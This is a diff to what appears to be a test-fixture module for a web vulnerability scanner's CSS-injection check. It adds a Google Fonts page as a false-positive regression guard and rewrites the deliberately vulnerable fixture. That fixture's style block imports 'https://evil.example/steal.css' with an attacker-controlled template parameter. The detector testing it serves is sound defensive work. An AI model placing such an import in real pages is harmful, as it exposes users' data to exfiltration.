@@ -1172,12 +1172,25 @@ def m_pm_safe(v: str, ctx: dict) -> tuple:
 # parameters (param:"" -> clean URL).  The earlier "the layer can never
 # fire in this pipeline" note was WRONG: it fired the param-marker
 # reasoning at a page-level layer.
+#
+# Phase 140 correction: "the page ships a gadget" is not "the page is
+# exploitable".  The old vuln target was a plain static @import with no
+# user input anywhere -- byte-for-byte the shape of a page legitimately
+# loading a CDN stylesheet (Google Fonts emits @font-face + unicode-range
+# + external src:url()).  Scanned against OWASP Juice Shop that rule
+# produced a *high* false positive while both real XSS went unreported.
+# CSSI is, by this module's own definition, "attacker-controlled input
+# placed into a CSS context" -- so the gadget must be user-controlled.
+# The template variable keeps it a static, parameterless page (pure static
+# analysis still finds it) while making the CSS context genuinely
+# attacker-controlled.
 # ---------------------------------------------------------------------------
 
 def m_cssi_vuln(v: str, ctx: dict) -> tuple:
-    """Static page whose <style> imports an external stylesheet."""
+    """Static page whose <style> interpolates a template var into @import."""
     return _page("<h1>Theme demo</h1>"
-                 "<style>@import url(https://evil.example/steal.css);</style>"
+                 "<style>@import url(https://evil.example/steal.css"
+                 "?theme={{user_theme}});</style>"
                  "<p>Custom theme preview.</p>")
 
 
@@ -1186,6 +1199,26 @@ def m_cssi_safe(v: str, ctx: dict) -> tuple:
     return _page("<h1>Theme demo</h1>"
                  "<style>.theme-box{color:#333;padding:8px;}</style>"
                  "<p>Custom theme preview.</p>")
+
+
+def m_cssi_gfonts_safe(v: str, ctx: dict) -> tuple:
+    """Phase 140: an ordinary page loading a real CDN webfont.
+
+    Not a vulnerability -- nothing here is attacker-controlled.  This is
+    the regression guard for the false positive seen on OWASP Juice Shop:
+    a page using Google Fonts emits exactly the @font-face + unicode-range
+    + external src:url() gadget shape.
+    """
+    return _page(
+        "<h1>Shop</h1>"
+        "<style>"
+        "@font-face{font-family:'VT323';font-style:normal;font-weight:400;"
+        "font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/"
+        "pxiKyp0ihIEF2isfFJU.woff2) format('woff2');"
+        "unicode-range:U+0102-0103,U+0110-0111;}"
+        "body{font-family:'VT323',monospace}"
+        "</style>"
+        "<p>Welcome to the shop.</p>")
 
 
 # ---------------------------------------------------------------------------
@@ -1502,6 +1535,7 @@ MODES_CTX.update({
 PAGE_MODES.update({
     "cssi_vuln": m_cssi_vuln,
     "cssi_safe": m_cssi_safe,
+    "cssi_gfonts_safe": m_cssi_gfonts_safe,
     "pe_vuln": m_pe_vuln,
     "pe_safe": m_pe_safe,
     "clobber_vuln": m_clobber_vuln,
